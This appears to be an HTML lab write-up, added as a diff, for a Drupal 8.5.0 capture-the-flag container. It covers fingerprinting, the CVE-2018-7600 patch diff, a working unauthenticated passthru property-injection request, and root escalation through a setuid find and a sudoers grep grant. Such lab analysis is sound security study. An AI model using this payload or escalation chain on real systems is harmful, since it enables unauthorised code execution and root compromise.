@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 82 Ejotapete &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Ejotapete</p><h1 id="82-ejotapete--writeup">82 Ejotapete — writeup</h1>
+<p><strong>Lab:</strong> 82 · <em>Ejotapete</em> · <strong>Fácil</strong>
+<strong>Description (full, from the platform catalog, <code>dockerlabs/catalog.txt:44</code>):</strong> <em>&quot;Máquina para
+explotar una vulnerabilidad en un CMS drupal que no corre en la raíz del puerto 80, así como una
+escalada de privilegios con dos vías distintas.&quot;</em>
+<strong>Target:</strong> <code>[net-0-7]</code> — single container <code>ejotapete_container</code>, image <code>ejotapete:latest</code>.
+<strong>Stack (from the artefact, not from memory):</strong> Debian GNU/Linux <strong>9 (stretch)</strong>, Apache <strong>2.4.25</strong>,
+PHP <strong>7.2.3</strong> as <code>mod_php</code> (<code>php7_module (shared)</code>), <strong>Drupal 8.5.0</strong> as shipped <em>and</em> as running
+(§9), SQLite as the datastore. One listening socket: <code>0.0.0.0:80</code>.
+<strong>Result:</strong> unauthenticated → <strong><code>uid=33(www-data)</code></strong> → <strong><code>euid=0(root)</code></strong> (real uid stays 33).
+<strong>Reward:</strong> <code>/root/secretitomaximo.txt</code> = <code>nobodycanfindthispasswordrootrocks</code>. No <code>FLAG{}</code> anywhere
+(§8).</p>
+<p><strong>Topology.</strong> <code>auto_deploy.sh</code> was read, never run. It creates <strong>no network at all</strong> — a bare
+<code>docker run -d --name $CONTAINER_NAME $IMAGE_NAME</code> on the default bridge, one container, no macvlan,
+no <code>--internal</code>, no second host, no pivot. The engagement stayed single-host. The image's own
+<code>Cmd</code> is <code>[&quot;apache2-foreground&quot;]</code> with <code>ENTRYPOINT [&quot;docker-php-entrypoint&quot;]</code> and
+<code>ExposedPorts {&quot;80/tcp&quot;:{}}</code>, so the topology was readable from <code>docker inspect</code> before a single
+packet was sent.</p>
+<hr />
+<h2 id="0-platform-fingerprint-the-label-is-right-and-the-version-is-the-whole-answer">0. Platform fingerprint: the label is right, and the version is the whole answer</h2>
+<p>The queue says Drupal. <strong>The label is correct</strong> — this is the first platform in the corpus where the
+catalogue's product name survives the check, and it is worth saying so explicitly, because the
+corpus has four mislabelled labs (32, 220, 12, 26) and the reflex is to assume a fifth.</p>
+<p>It is correct, but it is only <em>half</em> a fingerprint, and the half the catalogue gives you is the half
+that does not matter. Read from a version-bearing file in the artefact, with the container entrypoint
+overridden so nothing starts and no request is ever made:</p>
+<pre><code>$ docker run --rm --entrypoint sh ejotapete:latest \
+    -c 'grep -n &quot;const VERSION&quot; /var/www/html/drupal/core/lib/Drupal.php'
+85:  const VERSION = '8.5.0';
+</code></pre>
+<p>Corroborated three more ways, all read rather than recalled:</p>
+<ul>
+<li>the image's own build arguments, <code>docker inspect -f '{{json .Config.Env}}'</code>:
+<code>[&quot;DRUPAL_VERSION=8.5.0&quot;,&quot;DRUPAL_MD5=5679d3fa188fb80368ee46ab40acdb6b&quot;, …,&quot;PHP_VERSION=7.2.3&quot;, …]</code></li>
+<li>the profile's stamped header, <code>core/profiles/standard/standard.info.yml:47-50</code>:
+<code>version: '8.5.0'</code> / <code>core: '8.x'</code> / <code>datestamp: 1520457825</code></li>
+<li>as served: <code>X-Generator: Drupal 8 (https://www.drupal.org)</code> — <strong>which is why the response header is
+not a fingerprint either</strong>: it says <code>8</code>, and the whole engagement turns on <code>8.5.0</code> vs <code>8.5.1</code>.</li>
+</ul>
+<blockquote>
+<p><strong>The version, not the product name, is what decides the attack surface — and this lab is a clean
+demonstration of it.</strong> <code>8.5.0</code> and <code>8.5.1</code> are the same product, the same directory layout, the
+same <code>Generator</code> string, the same <code>standard</code> profile, and differ by <strong>one file and one call</strong>. That
+difference is the entire unauthenticated attack surface (§4). A tester who reads <code>Drupal 8</code> and
+looks for a <code>jsonapi</code> or a <code>rest</code> route finds nothing — and finds <em>nothing for the right reason</em>:
+JSON:API first shipped in 8.7, <code>rest</code> is not in <code>core.extension</code>, so <code>GET /drupal/jsonapi</code> → 404
+is a <strong>version fact</strong>, not a hardening fact. Nothing in this deployment was configured to remove
+those routes; they had not been written yet.</p>
+</blockquote>
+<p><strong>Zero third-party code, measured three ways</strong> — and this is what makes the lab a <em>core</em> lab:</p>
+<table>
+<thead>
+<tr>
+<th>Measurement</th>
+<th>Count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ls /var/www/html/drupal/modules/</code></td>
+<td><strong>1</strong> entry — <code>README.txt</code></td>
+</tr>
+<tr>
+<td><code>ls /var/www/html/drupal/themes/</code></td>
+<td><strong>1</strong> entry — <code>README.txt</code></td>
+</tr>
+<tr>
+<td><code>core/modules</code> directories on disk</td>
+<td>75</td>
+</tr>
+<tr>
+<td><code>core/themes</code> directories on disk</td>
+<td>6</td>
+</tr>
+<tr>
+<td>entries in <code>core.extension</code></td>
+<td>42 (3 with weight &gt; 0, 39 with weight 0)</td>
+</tr>
+<tr>
+<td><code>core.extension</code> names with <strong>no</strong> directory on disk</td>
+<td><strong>1</strong>, and it is <code>standard</code> — the <em>profile</em>, weight 1000</td>
+</tr>
+<tr>
+<td><code>services.yml</code> files anywhere on the filesystem</td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>find -name RequestSanitizer.php</code></td>
+<td><strong>0</strong></td>
+</tr>
+</tbody>
+</table>
+<p>So there is no plugin, no contrib module, no contrib theme, no composer dependency to blame. The
+sink is Drupal core, and the only question worth asking is which core version.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- [net-0-7]
+Nmap scan report for [net-0-7]
+Host is up (0.000045s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25
+</code></pre>
+<p><strong>What TCP cannot see — measured, not assumed:</strong></p>
+<pre><code>$ docker exec ejotapete_container cat /proc/net/udp
+  sl  local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt  uid  timeout inode ref pointer drops
+                                                &lt;- header only: 0 rows, 0 bytes of data
+$ docker exec ejotapete_container awk 'NR&gt;1{print $2,$4}' /proc/net/tcp
+  00000000:0050 0A      &lt;- 0.0.0.0:80 and nothing else
+</code></pre>
+<p><code>ps</code> confirms the process set and, as importantly, what is <strong>absent</strong>:</p>
+<pre><code>USER         PID COMMAND
+root           1 apache2 -DFOREGROUND
+www-data      17-21 apache2 -DFOREGROUND
+</code></pre>
+<p><strong>No <code>sshd</code>, no database daemon, no <code>cron</code>, no MTA, no Docker socket, no volumes</strong> — the mount table
+holds <strong>3</strong> entries and all three are Docker's own bind-ins (<code>/etc/resolv.conf</code>, <code>/etc/hostname</code>,
+<code>/etc/hosts</code>). Compare lab 32, which shipped <code>sshd</code> and <code>mysqld</code> in the image <code>Cmd</code>; this lab ships
+one process. <strong>The whole engagement is one HTTP service, and both escalation rungs are inside that
+one container.</strong></p>
+<h3 id="11-paths--the-catalogues-not-on-the-root-of-port-80-is-a-topology-fact-and-it-costs-you">1.1 Paths — the catalogue's &quot;not on the root of port 80&quot; is a topology fact, and it costs you</h3>
+<p><code>DocumentRoot</code> is <code>/var/www/html</code> and Drupal lives one level down at <code>/var/www/html/drupal</code>. That is
+the entire content of the catalogue's first clause, and it is worth separating from the product
+question: a directory name is a topology fact, a <code>const VERSION</code> is a fingerprint.</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Result</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/</code></td>
+<td><strong>403</strong>, 285 B</td>
+<td><code>autoindex:error … No matching DirectoryIndex (index.php,index.html) found</code> — <strong>not</strong> a vhost and <strong>not</strong> a 404</td>
+</tr>
+<tr>
+<td><code>/drupal/</code></td>
+<td><strong>200</strong>, 8 892 B</td>
+<td>the site; <code>X-Generator: Drupal 8</code>, <code>X-Powered-By: PHP/7.2.3</code></td>
+</tr>
+<tr>
+<td><code>/drupal/user/login</code></td>
+<td>200, 11 126 B</td>
+<td>the only form that mattered (§4)</td>
+</tr>
+<tr>
+<td><code>/drupal/user/register</code></td>
+<td>200, 38 077 B</td>
+<td>the &quot;Create new account&quot; form — <strong>and a false lead, see §5 N2</strong></td>
+</tr>
+<tr>
+<td><code>/drupal/admin</code></td>
+<td><strong>403</strong>, 8 087 B</td>
+<td><code>access denied</code>, not a 404: the route exists</td>
+</tr>
+<tr>
+<td><code>/drupal/editor/dialog/image/basic_html</code></td>
+<td><strong>403</strong></td>
+<td><code>editor.use</code> delegates to the <em>text format</em> (§5 N3)</td>
+</tr>
+<tr>
+<td><code>/drupal/sites/default/files/.ht.sqlite</code></td>
+<td><strong>403</strong></td>
+<td><code>&lt;FilesMatch &quot;^\.ht&quot;&gt;</code>, <code>apache2.conf:195-197</code></td>
+</tr>
+<tr>
+<td><code>/drupal/sites/default/settings.php</code></td>
+<td><strong>403</strong></td>
+<td>Drupal's own <code>&lt;FilesMatch&gt;</code>, <code>drupal/.htaccess:6-8</code> (§6, C9)</td>
+</tr>
+<tr>
+<td><code>/drupal/composer.lock</code></td>
+<td><strong>403</strong></td>
+<td><strong>Drupal's own control</strong>, <code>drupal/.htaccess:6</code> — see §6, C10</td>
+</tr>
+<tr>
+<td><code>/drupal/jsonapi</code>, <code>/drupal/jsonapi/node</code></td>
+<td><strong>404</strong></td>
+<td>a <strong>version</strong> fact: JSON:API is 8.7+</td>
+</tr>
+<tr>
+<td><code>/drupal/update.php</code></td>
+<td><strong>403</strong></td>
+<td><code>settings.php:323</code> <code>$settings['update_free_access'] = FALSE;</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Three different 403s from three different directives</strong>, which is exactly why a status code cannot
+attribute a block. Each one is attributed in §6 with its own positive control.</p>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<p><strong>Entry criterion (the boring one, unchanged since 61/108/32):</strong> <em>does the platform expose a
+write primitive or a code-execution primitive to an unauthenticated caller, and — before budgeting
+for it — where does the write land?</em></p>
+<p><strong>Sources that settled it, in this order:</strong></p>
+<ol>
+<li><code>find -name RequestSanitizer.php</code> → <strong>0 files</strong>, and <code>grep -rl RequestSanitizer</code> over the entire
+docroot → <strong>0 files</strong>. A class in the <em>methodology</em> (<code>security</code>) is entirely absent. That is a
+fact worth ten minutes of recon by itself, and it is what pointed at the CVE.</li>
+<li><code>core/lib/Drupal/Core/DrupalKernel.php:544-546</code> — <code>preHandle()</code> goes <strong>straight</strong> to
+<code>loadLegacyIncludes()</code>. No sanitisation step in front of it.</li>
+<li><code>core/modules/file/src/Element/ManagedFile.php:175-179</code> — the sink, read in the artefact (§4).</li>
+</ol>
+<hr />
+<h2 id="3-drupals-model-what-the-unit-of-trust-is-and-where-the-boundary-is-drawn">3. Drupal's model: what the <strong>unit of trust</strong> is, and where the boundary is drawn</h2>
+<p>The brief asked for the Drupal-shaped answer to lab 61's &quot;a plugin is <em>activated code</em>&quot;. Here it is,
+stated generally.</p>
+<h3 id="31-wordpresss-unit-of-trust-for-contrast">3.1 WordPress's unit of trust, for contrast</h3>
+<p>In WordPress the unit is <strong>a file that activation lists</strong>. <code>wp_options.active_plugins</code> is a list of
+paths that core <code>include</code>s. Activation answers exactly one question — <em>does this code run</em> — never
+<em>is this code allowed to</em>. There is no manifest, no permission set, no sandbox, and the boundary is
+not drawn anywhere in the application tree. Hence lab 61's rule: any write primitive anywhere in
+WordPress is code execution, with no further step.</p>
+<h3 id="32-drupals-unit-of-trust-is-not-a-list--it-is-a-compiled-class-graph-cached-in-the-database">3.2 Drupal's unit of trust is <strong>not</strong> a list — it is a <strong>compiled class graph, cached in the database</strong></h3>
+<p>Measured on this instance:</p>
+<pre><code>$ php -r '… SELECT COUNT(*), SUM(LENGTH(data)) FROM cache_container'
+cache_container rows=2 bytes=643537
+$ php -r '… SELECT data FROM config WHERE name=&quot;core.extension&quot;'
+42 entries; 3 with weight &gt; 0 (menu_link_content=1, views=10, standard=1000)
+settings.php:692:  $settings['container_yamls'][] = $app_root . '/' . $site_path . '/services.yml';
+settings.php:795:  $config_directories['sync'] = 'sites/default/files/config_Z7me6…/sync';
+</code></pre>
+<p>Three consequences, and they are the transferable part:</p>
+<ol>
+<li><strong>There is no <code>active_plugins</code> analogue, and that is not a hardening — it is a different question
+entirely.</strong> WordPress asks &quot;is this extension enabled?&quot;; Drupal asks &quot;does this class exist, and
+has the container been rebuilt?&quot;. The state lives in a <strong>database row</strong> (<code>config.core.extension</code>),
+not in a file, so &quot;present vs active&quot; is measurable — and, as in lab 61, the two sets are not the
+same list. Here they are trivially consistent, because there is nothing third-party to be
+inconsistent about (§0).</li>
+<li><strong>The Drupal-shaped write primitive is not a file, it is a <code>services.yml</code> or a config object.</strong>
+<code>sites/default/services.yml</code> is loaded into the container by <code>settings.php:692</code>, and a service
+definition <em>is</em> a class instantiation — a write there is code execution, and it is invisible to
+every &quot;which extension is enabled?&quot; question. <strong>Measured: the file does not exist, and the write
+primitive is closed by a filesystem mode, not by a policy</strong> — <code>sites/default</code> is <code>555</code>
+<code>www-data:www-data</code>, and <code>touch …/services.yml.probe</code> as <code>www-data</code> returns
+<code>cannot touch …: Permission denied</code>. So Drupal's answer to &quot;activation is not a boundary&quot; is
+<em>there is no activation to abuse</em>; the guard is a directory mode, and it is a <strong>second</strong>, thinner
+guard than anything in WordPress, because a single <code>chmod</code> reopens it and nothing in the
+application would object.</li>
+<li><strong>The genuinely unguarded Drupal primitive is the config store, and I did not test it.</strong> 174
+config objects in the <code>config</code> table, and <code>config_directories['sync']</code> at <code>settings.php:795</code>
+points at a directory of <strong>mode 775</strong> that <code>www-data</code> <strong>can</strong> write. Config import is how Drupal
+turns <em>data</em> into <em>behaviour</em> — a text format whose values are not code, whose effect is. This is
+Drupal's closest analogue of &quot;a write primitive becomes code execution&quot;, and it is <strong>listed under
+NOT tested</strong> (§5) with the reason, not filed as a finding.</li>
+</ol>
+<p><strong>The unit of trust, in one sentence: in Drupal the trusted unit is the compiled service container,
+and it is neither listed in a file nor permissioned per item — so the boundary is not drawn in the
+application at all. It is drawn in the webserver, and the webserver's half of it is one rewrite rule
+whose force depends on a single word in a file the operator has never read (§4.3, F3).</strong></p>
+<h3 id="33-where-the-boundary-is-drawn-and-that-it-holds">3.3 Where the boundary <em>is</em> drawn, and that it holds</h3>
+<p>Drupal ships <strong>two</strong> guards, and only one of them is load-bearing:</p>
+<ul>
+<li><code>sites/default/files/.htaccess</code> — the stock 685-byte guard, <code>SetHandler Drupal_Security_Do_Not_Remove_See_SA_2013_003</code> plus <code>&lt;IfModule mod_php5.c&gt; php_flag engine off</code>.</li>
+<li><code>drupal/.htaccess:6-8</code> — <code>&lt;FilesMatch &quot;…|composer\.(json|lock))$|…&quot;&gt;</code> + <code>Require all denied</code>.</li>
+<li><code>drupal/.htaccess:155</code> — <code>RewriteRule &quot;^(.+/.*|autoload)\.php($|/)&quot; - [F]</code>.</li>
+</ul>
+<p>The differential in §4.3 proves the first is redundant and the third is the boundary. The
+<code>&lt;IfModule mod_php5.c&gt;</code> half of the stock guard is <strong>dead on this image</strong> — the loaded module is
+<code>php7_module</code>, not <code>mod_php5</code> (<code>apache2ctl -M</code>) — and <code>/tmp/.htaccess</code> is a byte-identical
+<strong>copy</strong> of that same 685-byte guard sitting in a directory outside <code>DocumentRoot /var/www/html</code>, so
+it can never apply to anything. It is a decoy the author left behind, and a tester who greps for
+<code>.htaccess</code> finds two files and concludes &quot;the guard is doubled&quot;. It is not.</p>
+<hr />
+<h2 id="4-the-vulnerability-cve-2018-7600--sa-core-2018-002-property-injection-in-the-forms-api">4. The vulnerability: CVE-2018-7600 / SA-CORE-2018-002, property injection in the Forms API</h2>
+<h3 id="41-the-advisory-from-the-drupal-projects-own-git-history--not-from-memory">4.1 The advisory, from the Drupal project's own git history — not from memory</h3>
+<p>The fix is the <strong>only</strong> commit between the <code>8.5.0</code> and <code>8.5.1</code> tags that touches anything but the
+version string:</p>
+<pre><code>$ curl -s https://api.github.com/repos/drupal/drupal/compare/8.5.0...8.5.1 | jq …
+commits: 2
+  5ac8738fa6  SA-CORE-2018-002 by Jasu_M, samuel.mortenson, David_Rothstein, xjm, mlhess,
+              larowlan, pwolanin, alex
+  9798f28fe9  Drupal 8.5.1
+files:
+  modified  core/lib/Drupal.php
+  modified  core/lib/Drupal/Core/DrupalKernel.php
+  added     core/lib/Drupal/Core/Security/RequestSanitizer.php      &lt;- the whole fix
+</code></pre>
+<p>The added class, quoted from that diff:</p>
+<pre><code class="language-php">public static function sanitize(Request $request, $whitelist, $log_sanitized_keys = FALSE) {
+  if (!$request-&gt;attributes-&gt;get(self::SANITIZED, FALSE)) {
+    // Process query string parameters.
+    $get_sanitized_keys = [];
+    $request-&gt;query-&gt;replace(static::stripDangerousValues($request-&gt;query-&gt;all(), $whitelist, $get_sanitized_keys));
+    …
+    // Request body parameters.
+    $post_sanitized_keys = [];
+    $request-&gt;request-&gt;replace(static::stripDangerousValues($request-&gt;request-&gt;all(), $whitelist, $post_sanitized_keys));
+    …
+    // Cookie parameters.
+    …
+  }
+  return $request;
+}
+
+protected static function stripDangerousValues($input, array $whitelist, array &amp;$sanitized_keys) {
+  if (is_array($input)) {
+    foreach ($input as $key =&gt; $value) {
+      if ($key !== '' &amp;&amp; $key[0] === '#' &amp;&amp; !in_array($key, $whitelist, TRUE)) {
+        unset($input[$key]);
+        $sanitized_keys[] = $key;
+      }
+      else {
+        $input[$key] = static::stripDangerousValues($input[$key], $whitelist, $sanitized_keys);
+      }
+    }
+  }
+  return $input;
+}
+</code></pre>
+<p>and the call site inserted into <code>DrupalKernel::preHandle()</code>:</p>
+<pre><code class="language-php"> public function preHandle(Request $request) {
++    // Sanitize the request.
++    $request = RequestSanitizer::sanitize(
++      $request,
++      (array) Settings::get(RequestSanitizer::SANITIZE_WHITELIST, []),
++      (bool) Settings::get(RequestSanitizer::SANITIZE_LOG, FALSE)
++    );
+ 
+     $this-&gt;loadLegacyIncludes();
+</code></pre>
+<p><strong>The fix is one sentence: strip every key beginning with <code>#</code> from GET, POST and COOKIE before the
+application sees them.</strong> The advisory is <code>SA-CORE-2018-002</code>, released 28 Mar 2018, CVE-2018-7600, and
+the affected 8.x ranges are <code>&lt; 8.3.9</code>, <code>&lt; 8.4.6</code>, <strong><code>&lt; 8.5.1</code></strong> — so <strong>8.5.0 is the last vulnerable
+release of the 8.5 branch</strong>, which is plainly why the lab ships it.</p>
+<blockquote>
+<p><strong>A correction to the shape of the belief, and it is the reason this section exists.</strong> The obvious
+place to look is the Form API's own <code>FormBuilder.php</code>, because that is where the form cache and the
+<code>#</code>-prefixed properties live. I downloaded the 8.5.1 copy and diffed it against the shipped one:</p>
+<pre><code>$ diff -u lab82_FormBuilder_8.5.0.php d8.5.1_fb.php
+(no output)
+</code></pre>
+<p><strong>Byte-identical.</strong> The Forms API is not what changed. A tester who diffs the file that &quot;must&quot; be
+vulnerable — as this writeup did, for twenty minutes — concludes the site is patched. The fix is in
+<code>DrupalKernel</code>, one layer <em>above</em> every form, because the fix is about the <strong>request</strong>, not about
+forms. <code>FormBuilder.php</code> is a red herring, and it is a red herring by construction: the file is
+50 KB of form plumbing and the patch is 99 lines in a namespace (<code>Drupal\Core\Security</code>) that did
+not exist before.</p>
+</blockquote>
+<h3 id="42-the-sink-read-in-the-artefact">4.2 The sink, read in the artefact</h3>
+<p><code>core/modules/file/src/Element/ManagedFile.php:175-193</code>:</p>
+<pre><code class="language-php">  public static function uploadAjaxCallback(&amp;$form, FormStateInterface &amp;$form_state, Request $request) {
+    $renderer = \Drupal::service('renderer');
+
+    $form_parents = explode('/', $request-&gt;query-&gt;get('element_parents'));
+
+    // Retrieve the element to be rendered.
+    $form = NestedArray::getValue($form, $form_parents);
+    …
+    $output = $renderer-&gt;renderRoot($form);
+</code></pre>
+<p>Two attacker-controlled pieces meet here:</p>
+<ul>
+<li><code>element_parents</code> is a <strong>query-string parameter read with no validation at all</strong> (<code>:176</code>), and it
+selects a sub-array of the form to hand to the renderer (<code>:179</code>, <code>:193</code>);</li>
+<li>the <strong>POST body</strong> supplies the contents of that sub-array, and <code>#</code>-prefixed keys in a POST body are
+render-array properties in Drupal 8 (<code>#post_render</code>, <code>#pre_render</code>, <code>#access_callback</code>,
+<code>#lazy_builder</code>, <code>#type</code>, <code>#markup</code>).</li>
+</ul>
+<p>So the request chooses <em>which part of the form to render</em> and <em>what it contains</em>. <code>Renderer::doRender()</code>
+then calls the attacker-named callable. In 8.5.1 neither half survives, because <code>preHandle()</code> has
+already deleted every <code>#</code>-prefixed key from both bags.</p>
+<p><strong>The request, unauthenticated, one round trip:</strong></p>
+<pre><code>POST /drupal/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax
+Content-Type: application/x-www-form-urlencoded
+
+form_id=user_register_form&amp;_drupal_ajax=1
+&amp;mail[a][#post_render][]=passthru
+&amp;mail[a][#type]=markup
+&amp;mail[a][#markup]=id
+</code></pre>
+<p><code>ajax_form</code> is <code>FormBuilderInterface::AJAX_FORM_REQUEST</code> (<code>FormBuilderInterface.php:23</code>); <code>_drupal_ajax=1</code>
+makes the form cache itself and return a build id; <code>form_id=user_register_form</code> is the anonymous
+<code>/drupal/user/register</code> form; <code>account/mail/%23value</code> walks the form tree to the <code>mail</code> element's
+<code>#value</code>, which is exactly where the POST body landed. <code>passthru</code> is the callable; its return value
+replaces the element, so <strong>the command's stdout comes back in the response body</strong> — an in-band
+oracle, not a blind one.</p>
+<h3 id="43-the-chain-with-the-identity-proof-at-every-hop">4.3 The chain, with the identity proof at every hop</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (uid/euid as a pair)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong><code>uid=33(www-data)</code></strong></td>
+<td>CVE-2018-7600 property injection: <code>ManagedFile::uploadAjaxCallback</code> renders an attacker-shaped sub-array; <code>Renderer::doRender()</code> calls <code>passthru</code></td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>; <code>Uid: 33 33 33 33</code> / <code>Gid: 33 33 33 33</code>; <code>pwd</code> = <code>/var/www/html/drupal</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong><code>euid=0(root)</code></strong></td>
+<td><code>/usr/bin/find</code> is mode <strong>4755</strong> and baked into the image; <code>find … -exec sh -c '…'</code> runs the child with euid 0</td>
+<td><code>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</code>; <strong><code>Uid: 33 0 0 0</code></strong> (real 33, effective 0, saved-set 0, fs 0); <code>Gid: 33 33 33 33</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>reward</strong></td>
+<td>the same <code>find -exec cat</code> reads a <code>drwx------ root</code> file</td>
+<td><code>/root/secretitomaximo.txt</code> = <code>nobodycanfindthispasswordrootrocks</code> (35 B)</td>
+</tr>
+</tbody>
+</table>
+<p>Hop 2 is a <strong>setuid transition with an asymmetric pair</strong>, and the pair is the finding: the process
+is still <code>www-data</code> in every real sense, and only its <em>effective</em> uid is 0. <code>id</code> alone
+(<code>uid=33(www-data) … euid=0(root)</code>) already shows it, and <code>/proc/self/status</code> line 4 of the output
+(<code>Uid: 33 0 0 0</code>) is the part that cannot be misread.</p>
+<p><strong>The manufactured oracle (RUNBOOK: &quot;when the vector has no oracle, build the oracle before you
+exploit&quot;), written and then read back through the same vector:</strong></p>
+<pre><code>== MANUFACTURED ORACLE ==
+-rw-r--r-- 1 root www-data 98 /root/LAB82-1790794856-root
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+Uid:	33	0	0	0
+Gid:	33	33	33	33
+== CONTROL: identical write as www-data, no setuid find ==
+sh: 6: cannot create /root/LAB82-1790794856-wwwdata: Permission denied
+</code></pre>
+<p>A uniquely-marked file, in a directory <code>www-data</code> provably cannot write, created by the payload and
+re-read by the payload. The control is the <em>same</em> command one line apart in the same request.</p>
+<p><strong>The full chain in one request, with the negative control inside it:</strong></p>
+<pre><code>== HOP1: the execution identity of the CVE payload ==
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Uid:	33	33	33	33
+Gid:	33	33	33	33
+Groups:	33
+/var/www/html/drupal
+== HOP2: setuid /usr/bin/find, uid/euid pair ==
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+Uid:	33	0	0	0
+Gid:	33	33	33	33
+Groups:	33
+== HOP3: read the reward the same way ==
+nobodycanfindthispasswordrootrocks
+== CONTROL: the identical command WITHOUT the setuid find, as www-data ==
+cat: /root/secretitomaximo.txt: Permission denied
+ls: cannot open directory '/root/': Permission denied
+</code></pre>
+<p><strong>This exact transcript replays byte-for-byte (1 204 bytes) on a container recreated from the image
+after the engagement</strong> (§9) — so it is a property of the target, not of a moment in it.</p>
+<h3 id="44-why-usrbinfind-is-planted-and-not-stock">4.4 Why <code>/usr/bin/find</code> is planted and not stock</h3>
+<p>Fourteen setuid/setgid binaries exist. Thirteen are stock Debian. The fourteenth is <code>find</code>, and four
+independent measurements separate it from its own package:</p>
+<pre><code>$ ls -la /usr/bin/find /usr/bin/xargs          # same package, same mtime
+-rwsr-xr-x 1 root root 221768 Feb 18  2017 /usr/bin/find      &lt;- 4755
+-rwxr-xr-x 1 root root  67800 Feb 18  2017 /usr/bin/xargs    &lt;-  755
+
+$ grep -n 'bin/find' /var/lib/dpkg/info/findutils.md5sums
+1:b55e8d547380b3f0b80519049d461fbe  usr/bin/find
+$ md5sum /usr/bin/find
+b55e8d547380b3f0b80519049d461fbe                       &lt;- byte-identical to the package
+
+$ dpkg -V findutils | grep -c 'usr/bin/find'
+0                                                      &lt;- dpkg says the tree is unmodified
+</code></pre>
+<p>Same <code>dpkg</code> owner, same <code>mtime</code> to the second as its sibling from the same package, byte-identical to
+the packaged checksum — <strong>and mode 4755 where its sibling is 755.</strong> <code>chmod</code> does not touch <code>mtime</code>, so
+the setuid bit was applied after install. And note the last line: <strong><code>dpkg -V</code> does not verify modes</strong>,
+so the distro's own integrity tool reports this file as pristine. An absence from a verifier is not
+an absence of the property (§11.6 of the self-corrections, wearing a new costume).</p>
+<h3 id="45-the-second-escalation-path-and-why-two-paths-is-precisely-true">4.5 The second escalation path, and why &quot;two paths&quot; is precisely true</h3>
+<p><code>/etc/sudoers:6</code>, the last line, is the only non-stock line in the file:</p>
+<pre><code>ballenita ALL=(root) NOPASSWD: /bin/ls, /bin/grep
+</code></pre>
+<pre><code>== id as entered ==
+uid=1000(ballenita) gid=1000(ballenita) groups=1000(ballenita)
+
+User ballenita may run the following commands on ad55c1d4d37e:
+    (root) NOPASSWD: /bin/ls, /bin/grep
+
+--- PATH A: /bin/ls as root ---
+total 32
+drwx------ 1 root root     4096 Sep 30 19:03 .
+-rw-r--r-- 1 root www-data   98 Sep 30 19:03 LAB82-1790794856-root
+-rw-r--r-- 1 root root      35 Oct 16  2024 secretitomaximo.txt
+--- PATH B: /bin/grep as root ---
+nobodycanfindthispasswordrootrocks
+--- CONTROL 1: a program NOT on the grant ---
+sudo: a password is required
+--- CONTROL 2: /bin/ls cannot read file contents ---
+/root/secretitomaximo.txt
+</code></pre>
+<p><strong>This is the catalogue's &quot;escalada de privilegios con dos vías distintas&quot;, and the useful reading is
+not &quot;two ways in&quot; — it is that the two lines do different jobs and only one of them is the reward.</strong>
+<code>ls</code> reveals <em>names</em>; <code>grep</code> reveals <em>contents</em>. Path A alone does <strong>not</strong> read the file — control 2
+prints the path and stops. <strong>An operator who removes <code>/bin/ls</code> from the grant has closed nothing.</strong></p>
+<blockquote>
+<p><strong>Honesty note on how <code>ballenita</code> was entered, because this is the weakest link in the writeup and
+§25 applies.</strong> The grant was exercised <strong>on the target container</strong> — same image, same filesystem,
+same <code>/etc/sudoers</code> — but the <code>ballenita</code> identity was entered by the operator
+(<code>docker exec --user ballenita</code>), not reached by the chain. That is stated, not buried, and the
+reason is measured rather than asserted:</p>
+<ul>
+<li>From <strong>unauthenticated</strong>: nothing. <code>user.settings</code> <code>register=visitors_admin_approval</code>,
+<code>verify_mail=1</code>; §5 N2.</li>
+<li>From <strong><code>uid=33(www-data)</code></strong>: no route to uid 1000 in the image. No setuid helper drops
+privileges, and two of them <em>actively refuse</em> the euid-0-with-ruid-33 position the chain reaches:
+<code>su -s /bin/sh ballenita</code> → <code>su: must be run from a terminal</code> (Debian's
+<code>pam_securetty</code> in <code>/etc/pam.d/su</code> keys on the <strong>real</strong> uid), and <code>sudo -n -u ballenita</code> →
+<code>sudo: a password is required</code> (sudo authenticates on the <strong>real</strong> uid, which is still 33).</li>
+<li>From <strong><code>euid=0</code></strong>: a route exists, and it is trivial — <code>/etc/shadow</code> is <code>-rw-r----- root:shadow</code>
+and <code>ballenita</code> is <code>$6$…</code> SHA-512. I did not crack it, and I therefore make <strong>no claim</strong> that
+uid 1000 is unreachable. The accurate statement is narrower and the one that matters for
+severity: <strong>the sudoers ladder and the setuid ladder are disjoint, and an attacker who takes the
+setuid ladder has no reason to take the sudoers one.</strong></li>
+</ul>
+</blockquote>
+<hr />
